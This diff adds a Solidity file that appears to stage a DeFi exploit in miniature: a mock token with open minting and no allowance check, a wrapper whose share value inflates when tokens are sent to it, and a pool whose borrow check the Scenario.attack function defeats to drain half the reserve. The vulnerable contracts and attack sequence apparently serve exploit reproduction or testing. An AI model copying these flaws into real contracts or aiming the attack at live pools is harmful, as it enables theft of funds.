@@ -1,0 +1,10 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+contract XStockUSDC { mapping(address=>uint256) public balanceOf; string public constant name="XStockUSDC"; string public constant symbol="XStockUSDC"; uint8 public constant decimals=18; function mint(address to,uint256 a) external{balanceOf[to]+=a;} function transfer(address to,uint256 a) external returns(bool){require(balanceOf[msg.sender]>=a,"balance");balanceOf[msg.sender]-=a;balanceOf[to]+=a;return true;} function transferFrom(address f,address t,uint256 a) external returns(bool){require(balanceOf[f]>=a,"balance");balanceOf[f]-=a;balanceOf[t]+=a;return true;} }
+
+contract XStockWrapper { XStockUSDC public immutable asset; uint256 public totalAssets; constructor(XStockUSDC a){asset=a;} function donate(uint256 a) external { asset.transferFrom(msg.sender,address(this),a); totalAssets+=a; } function convertToAssets(uint256 s) external view returns(uint256){return s+asset.balanceOf(address(this));} }
+contract EdelCollateralPool { XStockUSDC public immutable asset; XStockWrapper public immutable wrapper; constructor(XStockUSDC a,XStockWrapper w){asset=a;wrapper=w;} function borrow(address to,uint256 amount) external { require(wrapper.convertToAssets(1)>1,"underwater"); asset.transfer(to,amount); } }
+
+contract Scenario { XStockUSDC public asset; XStockWrapper public wrapper; EdelCollateralPool public pool; address public immutable owner; uint256 public constant SEED=1_000_000 ether; constructor(){owner=msg.sender; asset=new XStockUSDC(); wrapper=new XStockWrapper(asset); pool=new EdelCollateralPool(asset,wrapper); asset.mint(address(pool),SEED); asset.mint(owner,SEED); } function attack(address receiver) external { require(msg.sender==owner,"unauthorized"); asset.transfer(address(wrapper),SEED/2); wrapper.donate(0); pool.borrow(receiver,SEED/2); } function reserveBalance() external view returns(uint256){return asset.balanceOf(address(pool));} function attackerBalance(address a) external view returns(uint256){return asset.balanceOf(a);} function assetAddress() external view returns(address){return address(asset);} }
+
